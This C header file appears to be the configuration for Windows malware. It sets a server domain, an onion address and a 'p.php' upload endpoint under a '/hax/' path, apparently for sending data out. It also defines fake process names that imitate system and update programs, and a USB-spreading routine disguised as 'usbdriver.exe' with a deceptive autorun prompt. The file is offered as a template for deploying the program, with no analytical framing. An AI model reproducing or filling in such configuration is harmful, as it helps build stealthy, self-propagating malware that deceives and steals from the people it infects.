#pragma once

/* --------------------------------------------------------------------------*/
/* ----------------------------------SERVER----------------------------------*/
/* --------------------------------------------------------------------------*/

// Domain of your web server, e.g. example.org
#define V_NET_DOMAIN "einbaum.org"

// Domain of your onion web server
#define V_NET_DOMAIN_ONION "r7p5lpny2qi2n6eb.onion"

// Subfolder where your files are located.
// Example 1:
//   Your put_data.php is in example.org/files/test/put_data.php
//   Variable value: "/files/test/"
// Example 2:
//   Your put_data.php is in example.org/put_data.php
//   Variable value: "/"
#define V_NET_BASE "/hax/"

// Web server port
#define V_NET_PORT 80

// Don't change this (unless you've actually changed the name of p.php)
#define V_NET_FILE_DATA "p.php"


/* --------------------------------------------------------------------------*/
/* ----------------------------------CLIENT----------------------------------*/
/* --------------------------------------------------------------------------*/

// Random unique identifier used to prevent this program from starting twice
#define V_UNIQUE_ID L"something_unique_1337"


// Fake executable names that might appear in task manager
#define V_FAKE_NAME1 L"FlashUpdate.exe"
#define V_FAKE_NAME2 L"smss.exe"
#define V_FAKE_NAME3 L"WindowsUpdate.exe"

// Temporary files that might or might not be deleted.
#define V_FAKE_TMP1  L"FLupdate_4x8c.tmp"
// Do not remove .exe
#define V_FAKE_TMP2  L"FLupdate_4x8d.exe"


// File name when the program is copied to USB
#define V_FAKE_USB_FILE   L"usbdriver.exe"
// Autorun dialog box title
#define V_FAKE_USB_LABEL  L"Device"
// Autorun program name
#define V_FAKE_USB_ACTION L"Open folder to view files"